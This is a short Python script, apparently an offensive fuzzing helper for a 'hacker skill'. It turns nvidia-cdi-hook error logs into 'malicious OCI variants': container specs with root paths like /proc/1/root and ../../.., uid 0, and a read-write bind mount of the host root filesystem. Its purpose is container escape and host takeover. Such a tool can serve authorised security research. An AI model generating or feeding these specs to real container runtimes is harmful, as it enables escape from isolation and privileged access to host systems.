#!/usr/bin/env python3
"""
Simple error-driven OCI variant generator for the hacker skill.
Feed it lines from nvidia-cdi-hook errors / strace and it suggests mutations.

Usage:
  python3 generate_variants.py < /tmp/nvidia_ai_fuzz.log | head -30
"""
import sys
import json
import random

ERROR_HINTS = [
    "failed to determined container root",
    "failed to open OCI spec file",
    "failed to load container state",
    "Ignoring permission error",
    "No paths specified",
    "Skipping path",
    "operation not permitted",
    "EOF",
]

ROOT_IDEAS = [
    "/", "/proc/1/root", ".", "../../..", "/proc/1/root/..",
    "/tmp/evil", "/host", "/proc/self/root"
]

def generate_variant(hint: str) -> dict:
    root = random.choice(ROOT_IDEAS)
    spec = {
        "ociVersion": "1.0.0",
        "root": {"path": root},
        "process": {"user": {"uid": 0, "gid": 0}}
    }
    if "permission" in hint.lower() or "Ignoring" in hint:
        # Try to force more host visibility
        spec["mounts"] = [{"destination": "/hostroot", "source": "/", "options": ["rbind", "rw"]}]
    if "root" in hint.lower() or "container root" in hint.lower():
        # Aggressive relative + proc tricks
        spec["root"]["path"] = random.choice(["/proc/1/root", "../../..", "."])
    if random.random() < 0.3:
        spec["annotations"] = {"hacker-skill": "mutation"}
    return spec

def main():
    hints = []
    for line in sys.stdin:
        for h in ERROR_HINTS:
            if h.lower() in line.lower():
                hints.append(h)
    if not hints:
        hints = ["general"]

    print("# Generated malicious OCI variants (feed these into your harness)")
    for _ in range(25):
        hint = random.choice(hints)
        v = generate_variant(hint)
        print(json.dumps(v, separators=(",", ":")))

if __name__ == "__main__":
    main()
